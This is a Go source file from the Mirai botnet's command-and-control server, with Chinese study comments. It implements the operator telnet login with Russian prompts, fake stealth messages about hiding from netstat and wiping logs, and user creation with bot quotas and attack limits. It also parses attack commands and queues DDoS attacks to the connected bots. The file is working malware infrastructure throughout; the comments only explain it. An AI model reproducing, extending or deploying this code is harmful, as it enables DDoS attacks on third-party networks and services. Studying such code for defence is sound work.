package main

import (
	"fmt"
	"io/ioutil"
	"net"
	"strconv"
	"strings"
	"time"
)

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

//在terminal中\u001B或\033【POSIX】通常表示后面跟着命令或者转义字符。相当于ESC (\033 octal)
//By sending control sequences to the terminal (xterm, vt-220) or using ncurses (like mc).
//A ANSI Escape Sequence starts with ESC (\033 octal) [. ; separates Numbers
//https://stackoverflow.com/questions/15044274/how-does-vi-restore-terminal-content-after-quitting-it
//是xterm的多种不同转义序列支持
//可以使用echo -ne “xxxxx”进行测试
func (this *Admin) Handle() { //处理admin的接入【基本上users数据库中有的用户都可以登录，mirai server执行命令】
	this.conn.Write([]byte("\033[?1049h")) //感觉可以理解为一个新的终端开启【进入VT100模式，支持奇特的字符输出？】
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	defer func() {
		this.conn.Write([]byte("\033[?1049l")) //之前创建的新终端结束【从VT100模式退出】
	}()

	headerb, err := ioutil.ReadFile("prompt.txt") //先读取prompt.txt文件作为提示语使用【没有找到这个文件会直接 return】
	if err != nil {
		return
	}
	//对于bot连接到server端的情况，bot处首先会收到这个prompt提示符。
	header := string(headerb)
	this.conn.Write([]byte(strings.Replace(strings.Replace(header, "\r\n", "\n", -1), "\n", "\r\n", -1)))

	// Get username
	this.conn.SetDeadline(time.Now().Add(60 * time.Second)) //然后再延时60s后，再发送。提示输入，获取用户名
	//发送蓝色的“пользователь”字样【格式"\033[字背景颜色;字体颜色m字符串\033[0m"，这里配置的是浅蓝色式样】
	//пользователь=User【俄罗斯语】
	this.conn.Write([]byte("\033[34;1mпользователь\033[33;3m: \033[0m"))
	username, err := this.ReadLine(false) //自定义API
	if err != nil {
		return
	}

	// Get password
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))        //延时60s，获取密码。
	this.conn.Write([]byte("\033[34;1mпароль\033[33;3m: \033[0m")) //密码
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}

	this.conn.SetDeadline(time.Now().Add(120 * time.Second))
	this.conn.Write([]byte("\r\n"))
	spinBuf := []byte{'-', '\\', '|', '/'} //这是进度条加载的那种转圈的提示- \ | / - ……
	for i := 0; i < 15; i++ {
		this.conn.Write(append([]byte("\r\033[37;1mпроверив счета... \033[31m"), spinBuf[i%len(spinBuf)])) //账户验证
		time.Sleep(time.Duration(300) * time.Millisecond)                                                  //等待300ms验证
	}

	var loggedIn bool
	var userInfo AccountInfo
	//验证用户登录。
	if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn { //查询users数据库判断是否是合法登录。
		this.conn.Write([]byte("\r\033[32;1mпроизошла неизвестная ошибка\r\n"))               //出现未知错误
		this.conn.Write([]byte("\033[31mнажмите любую клавишу для выхода. (any key)\033[0m")) //按任何一个键退出
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}
	//提示admin成功登录到server
	this.conn.Write([]byte("\r\n\033[0m"))
	this.conn.Write([]byte("[+] DDOS | Succesfully hijacked connection\r\n"))
	time.Sleep(250 * time.Millisecond)
	this.conn.Write([]byte("[+] DDOS | Masking connection from utmp+wtmp...\r\n"))
	time.Sleep(500 * time.Millisecond)
	this.conn.Write([]byte("[+] DDOS | Hiding from netstat...\r\n"))
	time.Sleep(150 * time.Millisecond)
	this.conn.Write([]byte("[+] DDOS | Removing all traces of LD_PRELOAD...\r\n"))
	for i := 0; i < 4; i++ {
		time.Sleep(100 * time.Millisecond)
		this.conn.Write([]byte(fmt.Sprintf("[+] DDOS | Wiping env libc.poison.so.%d\r\n", i+1)))
	}
	this.conn.Write([]byte("[+] DDOS | Setting up virtual terminal...\r\n"))
	time.Sleep(1 * time.Second)

	//提示admin成功连接上server，并且进入terminal模式

	go func() {
		i := 0
		for {
			var BotCount int
			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
				BotCount = userInfo.maxBots
			} else {
				BotCount = clientList.Count()
			}

			time.Sleep(time.Second)
			//go协程中循环，不停地提示新加入的bot？给出bot总数？
			if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d Bots Connected | %s\007", BotCount, username))); err != nil {
				this.conn.Close()
				break
			}
			i++
			if i%60 == 0 {
				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
		}
	}()

	this.conn.Write([]byte("\033[37;1m[!] Sharing access IS prohibited!\r\n[!] Do NOT share your credentials!\r\n\033[36;1mReady\r\n"))
	for { //只要不是输入exit 或者 quit的命令，就会continue，等待键入下一个命令并处理。
		var botCatagory string
		var botCount int
		this.conn.Write([]byte("\033[32;1m" + username + "@botnet# \033[0m"))
		//读取bot发送过来的命令
		cmd, err := this.ReadLine(false)
		//cmd为bot发送给server的命令
		//bot可以发送的命令1: exit or quit【退出链接server的terminal】
		if err != nil || cmd == "exit" || cmd == "quit" {
			return
		}
		if cmd == "" {
			continue
		}
		botCount = userInfo.maxBots
		//bot可以发送的命令2: adduser【有些命令必须是一个sql中本来就是admin为1[管理员级别的用户]才可以使用】
		if userInfo.admin == 1 && cmd == "adduser" {
			//增加一个用户，需要给出username、password、最大bot数、允许最大攻击持续时间duration、冷却时间【重新发起攻击的间隔时间】
			this.conn.Write([]byte("Enter new username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("Enter new password: "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("Enter wanted bot count (-1 for full net): "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
				continue
			}
			this.conn.Write([]byte("Max attack duration (-1 for none): "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
				continue
			}
			this.conn.Write([]byte("Cooldown time (0 for none): "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
				continue
			}
			this.conn.Write([]byte("New account info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinue? (y/N)"))
			//确认输入数据无误。
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
			} else {
				this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
			}
			continue
		}
		//bot可以发送的命令3: botcount【有些命令必须是一个sql中本来就是admin为1[管理员级别的用户]才可以使用】
		//获取server上已经注册的bot的分布，输出到远端bot的控制台
		if userInfo.admin == 1 && cmd == "botcount" {
			m := clientList.Distribution()
			for k, v := range m {
				this.conn.Write([]byte(fmt.Sprintf("\033[36;1m%s:\t%d\033[0m\r\n", k, v)))
			}
			continue
		}
		//cmd[0]是'-',则需要解析参数
		//-num,num表示本次调度的bot数量。
		if cmd[0] == '-' {
			countSplit := strings.SplitN(cmd, " ", 2)
			count := countSplit[0][1:]
			botCount, err = strconv.Atoi(count)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
				continue
			}
			if userInfo.maxBots != -1 && botCount > userInfo.maxBots { // 调度的bot不能超过user本身的bot限度
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
				continue
			}
			cmd = countSplit[1] //cmd调整为下一个待解析参数
		}
		//@catagory:控制bot的类别？
		if userInfo.admin == 1 && cmd[0] == '@' {
			cataSplit := strings.SplitN(cmd, " ", 2)
			botCatagory = cataSplit[0][1:]
			cmd = cataSplit[1]
		}
		//剩下的参数由NewAttck进行解析【包括攻击的DDos类型，攻击目标、攻击时间和攻击包头配置等】
		//把解析结果存储到atk结构体中【此时还未真正发起攻击】
		atk, err := NewAttack(cmd, userInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
		} else {
			//配置信息序列化，转化为网络字节序buf【之后发送给bot】
			buf, err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
			} else {
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can { //记录攻击历史到history中
					this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
				} else if !database.ContainsWhitelistedTargets(atk) { //目标不能由白名单用户
					clientList.QueueBuf(buf, botCount, botCatagory) //真正利用这个server管辖的bot发起攻击
				} else {
					fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
				}
			}
		}
	}
}

//从bot中读取一行输入
func (this *Admin) ReadLine(masked bool) (string, error) {
	buf := make([]byte, 1024)
	bufPos := 0

	for {
		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\xFF' {
			n, err := this.conn.Read(buf[bufPos : bufPos+2])
			if err != nil || n != 2 {
				return "", err
			}
			bufPos--
		} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
			if bufPos > 0 {
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos--
			}
			bufPos--
		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			this.conn.Write([]byte("\r\n"))
			return string(buf[:bufPos]), nil
		} else if buf[bufPos] == 0x03 {
			this.conn.Write([]byte("^C\r\n"))
			return "", nil
		} else {
			if buf[bufPos] == '\x1B' {
				buf[bufPos] = '^'
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos++
				buf[bufPos] = '['
				this.conn.Write([]byte(string(buf[bufPos])))
			} else if masked {
				this.conn.Write([]byte("*"))
			} else {
				this.conn.Write([]byte(string(buf[bufPos])))
			}
		}
		bufPos++
	}
	return string(buf), nil
}
